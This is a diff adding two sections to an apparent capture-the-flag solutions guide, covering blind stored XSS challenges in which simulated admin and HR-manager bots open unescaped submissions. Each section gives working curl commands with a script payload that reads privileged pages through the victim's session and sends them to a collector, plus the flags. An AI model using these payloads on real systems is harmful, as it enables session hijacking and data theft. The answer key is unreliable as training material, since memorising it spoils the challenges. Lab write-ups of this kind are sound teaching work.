@@ -856,3 +856,108 @@ Two independent bugs, in order — there is no shortcut past either one.
    directly — only readable after RCE, so it's not a pre-solve spoiler;
    `/opt/aramoon/notes.txt` is an unrelated decoy, a Nabil/JWT-secret
    easter egg cross-referencing challenge 16's `jwt-weak-secret`.)
+
+---
+
+## 18. IT Helpdesk Blind Stored XSS → Admin Session Hijack — flag19
+
+This is a *real* blind-XSS bug, not self-XSS: a headless-Chromium bot
+plays the IT admin inside the container, actually logging in and opening
+tickets, so a stored payload genuinely executes in a privileged session
+you never get to touch directly.
+
+1. `http://<TARGET_IP>:6000/` is a public "Submit a Support Ticket" form
+   (name, subject, message). There's also a `Staff Login` link
+   (`/admin/login`) — no valid credentials for it are ever exposed
+   anywhere on the box; brute-forcing it is not the intended path.
+2. The page copy hints that ticket messages "support rich formatting so
+   replies render nicely for staff." That's the tell: the admin-only
+   ticket-detail view (`/admin/tickets/<id>`) renders a ticket's
+   `message` field with Jinja2's `{{ ... | safe }}`, i.e. completely
+   unescaped. An IT admin bot (not a real human) logs into `/admin` on
+   its own every ~20 seconds and opens each open ticket — any HTML/JS in
+   a ticket's message executes for real, inside that admin's
+   authenticated session.
+3. The flag lives behind `/admin/flag`, gated on that same admin session
+   cookie. The cookie is `HttpOnly` (as a real one should be) — reading
+   `document.cookie` from your payload is a dead end on purpose. The
+   trick is that a same-origin `fetch()` issued *from inside the
+   payload* still rides the admin's session regardless of `HttpOnly`,
+   because the browser attaches cookies to same-origin requests
+   automatically; only client-side *reading* of the cookie value is
+   blocked, not authenticated requests.
+4. Since there's no outbound internet access required (or wanted), the
+   app ships its own tiny built-in "collector" so you can catch the
+   exfiltrated response yourself:
+   ```bash
+   curl http://<TARGET_IP>:6000/collector/new
+   # -> hands you a private token and /collector/<token>/hit and
+   #    /collector/<token>/log URLs
+   ```
+5. Submit a ticket whose `message` is a payload that authenticates to
+   `/admin/flag` and relays the response to your collector:
+   ```bash
+   curl http://<TARGET_IP>:6000/submit \
+     --data-urlencode "name=Anas" \
+     --data-urlencode "subject=VPN issue" \
+     --data-urlencode "message=<script>fetch('/admin/flag',{credentials:'include'}).then(r=>r.text()).then(t=>fetch('/collector/<TOKEN>/hit?flag='+encodeURIComponent(t)))</script>"
+   ```
+6. Wait roughly one bot cycle (~20-40 seconds — the bot polls, logs in
+   fresh each time, and opens every open ticket), then check your
+   collector log:
+   ```bash
+   curl http://<TARGET_IP>:6000/collector/<TOKEN>/log
+   ```
+   It shows the admin bot's own exfiltrated request, containing the
+   `/admin/flag` response.
+
+   **Flag:** `CTF{BL1ND_XSS_H1J4CK5_TH3_4DM1N_B0T_0F_AR4M0n}`
+
+---
+
+## 19. Employee Kudos Wall Blind Stored XSS → Manager Session Hijack — flag20
+
+Same technique class as challenge 18, deliberately reskinned as an
+independent target — a moderation queue instead of a support-ticket
+queue, reviewed by a different simulated bot (HR manager instead of IT
+admin) — so the same blind-XSS-plus-bot pattern has to be re-recognized
+and re-solved from scratch rather than copy-pasted.
+
+1. `http://<TARGET_IP>:5050/` is a public "Kudos Wall" — anyone can post
+   a kudos card (sender, recipient, message) for a colleague. Approved
+   kudos show up on the public wall *escaped* (safe); new kudos first
+   sit in a moderation queue only an HR manager can see
+   (`/manager/login` — again, no valid credentials are ever exposed to
+   players; this isn't a creds-guessing challenge).
+2. The page copy hints kudos "support emoji and GIF embeds." The
+   moderation-preview route, `/manager/queue/<id>` (manager-only),
+   renders a pending kudos card's `message` with `{{ ... | safe }}` —
+   unescaped, unlike the public wall. An HR-manager bot logs into
+   `/manager` on its own every ~20 seconds and opens every pending
+   kudos card in the queue, so injected script executes for real inside
+   its authenticated session.
+3. The flag lives behind `/manager/secret-notes`, gated on that manager
+   session cookie (also `HttpOnly` by design — same reasoning as
+   challenge 18: exfiltrate via an authenticated same-origin `fetch()`
+   from the payload, not by reading `document.cookie`).
+4. This app has its own separate built-in collector (identical mechanism
+   to challenge 18, but its own instance/state):
+   ```bash
+   curl http://<TARGET_IP>:5050/collector/new
+   ```
+5. Post a kudos whose `message` authenticates to `/manager/secret-notes`
+   and relays the response to your collector:
+   ```bash
+   curl http://<TARGET_IP>:5050/post \
+     --data-urlencode "sender=Anas" \
+     --data-urlencode "recipient=Ops Team" \
+     --data-urlencode "message=<script>fetch('/manager/secret-notes',{credentials:'include'}).then(r=>r.text()).then(t=>fetch('/collector/<TOKEN>/hit?flag='+encodeURIComponent(t)))</script>"
+   ```
+6. Wait roughly one bot cycle, then check your collector log:
+   ```bash
+   curl http://<TARGET_IP>:5050/collector/<TOKEN>/log
+   ```
+   It shows the manager bot's exfiltrated `/manager/secret-notes`
+   response.
+
+   **Flag:** `CTF{5T0R3D_XSS_1S_5T1LL_D4NG3R0U5_4_4R4M0N}`
